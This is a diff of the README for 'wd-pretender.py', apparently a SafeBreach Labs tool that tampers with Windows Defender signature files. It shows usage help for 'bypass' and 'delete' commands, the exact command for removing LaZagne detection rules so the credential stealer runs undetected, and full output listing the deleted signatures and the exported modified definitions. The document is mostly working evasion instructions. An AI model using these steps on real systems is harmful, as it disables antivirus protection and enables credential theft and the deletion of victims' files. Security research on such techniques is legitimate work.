@@ -24,62 +24,64 @@ usage: wd-pretender.py command [options]
 Windows Defender Update
 
 positional arguments:
-  {bypass}
-    bypass              bypass windows defender threats
+  {bypass,delete}
+    bypass             bypass windows defender rules by threat name
+    delete             delete file by modifying rules
 
 optional arguments:
-  -h, --help            show this help message and exit
-  -o O                  output folder for the exported vdm files
-  -d D                  set explicit definition update path
+  -h, --help           show this help message and exit
+  -o OUTPUT            output folder for the exported vdm files
+  -d DEFINITIONS_PATH  set explicit definitions path
 ```
 
 ### Bypass
 ```
-usage: wd-pretender.py command [options] bypass [-h] [-match MATCH | -name NAME | -id ID]
+        -- Defender-Pretender: v1.0.0 (SafeBreach Labs) --
 
-optional arguments:
-  -h, --help    show this help message and exit
-  -match MATCH  delete all threats that his name containes <name>
-  -name NAME    delete threat by name
-  -id ID        delete threat by his id
+[+] Getting Signatures Location ...
+usage: wd-pretender.py command [options] bypass [-h] threat_name
+
+positional arguments:
+  threat_name  delete all threats matching <threat_name>
 ```
 
 For example we want to bypass LaZagne rules and be able to execute LaZagne without been detected by Windows Defender.
 
 ```
-python wd-pretender.py -o C:\BypassDefs bypass -match lazagne
+python wd-pretender.py -o C:\BypassDefs bypass lazagne
 ```
 
 Output:
 
 ```
-python .\wd-pretender.py -o C:\BypassDefs bypass -match lazagne
+python .\wd-pretender.py -o C:\Users\omeratt\work\lab bypass lazagne
 
         -- Defender-Pretender: v1.0.0 (SafeBreach Labs) --
 
 [+] Getting Signatures Location ...
-[+] Definitions Path: C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{0E0FDC3E-A1A1-4500-9BEF-460F8E72E1C7}
-[+] Initializing DefinitionUpdate
+[+] Definitions Path: C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5235DDA9-EDFD-456F-A39A-88CF98DA5B71}
 [+] Loading mpasbase.vdm
 [+] Loading mpasdlta.vdm
 [+] Loading mpavbase.vdm
 [+] Loading mpavdlta.vdm
-
-[#] Delete threats from Anti-Spyware definitions
-[#] Delete threats from Anti-Virus definitions
-      Deleting -> b'\xd8!LaZagne'
-      Deleting -> b'HackTool:Python/LaZagne'
-      Deleting -> b'HackTool:Python/LaZagne.A!MTB'
-      Deleting -> b'\xd8!LaZagne!ml'
-      Deleting -> b'HackTool:Python/LaZagne.D!MTB'
-      Deleting -> b'\xcc!Golazagne.A!MTB'
-      Deleting -> b'HackTool:Python/LaZagne.B'
-      Deleting -> b'\xd8!LaZagne!sms'
-      Deleting -> b'\xcc!Lazagne.A!MTB'
-      Deleting -> b'\xcc\xe1Lazagne'
-[+] Exporting definitions into: C:\BypassDefs
-[+] mpasdlta.vdm: 1.389.2098.0 -> 1.389.2099.0
-[+] mpavdlta.vdm: 1.389.2098.0 -> 1.389.2099.0
+[+] Enumerating Anti-Virus Definitions
+[+] Threats Containing: lazagne
+        Deleting => b'\xd8!LaZagne'
+        Deleting => b'HackTool:Python/LaZagne'
+        Deleting => b'HackTool:Python/LaZagne.A!MTB'
+        Deleting => b'\xd8!LaZagne!ml'
+        Deleting => b'HackTool:Python/LaZagne.D!MTB'
+        Deleting => b'\xcc!Golazagne.A!MTB'
+        Deleting => b'HackTool:Python/LaZagne.B'
+        Deleting => b'\xd8!LaZagne!sms'
+        Deleting => b'\xcc!Lazagne.A!MTB'
+        Deleting => b'\xcc\xe1Lazagne'
+[+] Enumerating Anti-Spyware Definitions
+[+] Threats Containing: lazagne
+[+] Exporting Definitions into: C:\Users\omeratt\work\lab
+[+] mpasdlta.vdm: 1.391.491.0 => 1.391.492.0
+[+] mpavdlta.vdm: 1.391.491.0 => 1.391.492.0
+[+] Done!
 ```
 The output displays the deleted threat rules recorded by the tool, indicating the removal of 10 threats from the Anti-Virus definitions. The newly updated definitions have been exported to the user-supplied export path located at C:\BypassDefs.
 
